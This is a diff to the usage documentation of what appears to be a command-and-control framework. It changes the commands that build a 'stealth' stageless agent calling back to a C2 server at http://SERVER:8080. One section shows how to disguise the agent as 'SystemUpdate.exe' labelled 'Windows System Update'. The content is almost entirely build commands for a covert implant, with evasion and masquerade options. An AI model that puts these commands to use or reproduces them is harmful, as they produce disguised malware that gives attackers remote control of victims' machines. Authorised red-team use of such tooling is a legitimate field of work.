@@ -93,12 +93,10 @@ The full agent is what gets staged (uploaded to the server). Build it for the ta
 
 ```bash
 go run ./cmd/generate stageless \
-  --server http://SERVER:8080 \
+  --c2 http://SERVER:8080 \
   --key changeme \
   --profile stealth \
-  --os windows \
   --arch amd64 \
-  --strip \
   --no-gui \
   --output ./builds/agent.exe
 ```
@@ -447,7 +445,7 @@ Build a stageless agent and rename it convincingly:
 
 ```bash
 go run ./cmd/generate stageless \
-  --masq-origfile "SystemUpdate.exe" \
+  --masq-orig "SystemUpdate.exe" \
   --masq-desc "Windows System Update" \
   ... \
   --output SystemUpdate.exe
@@ -553,9 +551,9 @@ ENCRYPTION_KEY=changeme go run ./cmd/server --port 8080
 
 # ─── BUILD FULL AGENT ──────────────────────────────────────────────
 go run ./cmd/generate stageless \
-  --server http://SERVER:8080 --key changeme \
-  --profile stealth --strip --no-gui \
-  --os windows --arch amd64 \
+  --c2 http://SERVER:8080 --key changeme \
+  --profile stealth --no-gui \
+  --arch amd64 \
   --output ./builds/agent.exe
 
 # ─── UPLOAD TO STAGE ───────────────────────────────────────────────
